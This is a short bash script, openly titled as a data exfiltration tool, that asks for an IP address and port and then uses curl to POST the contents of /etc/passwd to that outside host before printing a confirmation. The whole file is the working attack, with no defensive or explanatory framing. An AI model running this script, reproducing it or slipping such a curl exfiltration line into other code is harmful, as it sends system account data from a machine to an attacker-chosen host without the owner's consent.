#!/bin/bash

echo -e "\e[92mData exfiltration using curl!"

printf "Enter the IP Addres: "
read IP
printf "Enter the Port: "
read PORT

curl -X POST -d @/etc/passwd $IP:$PORT

echo -e "\e[92mData sent to $IP:$PORT"
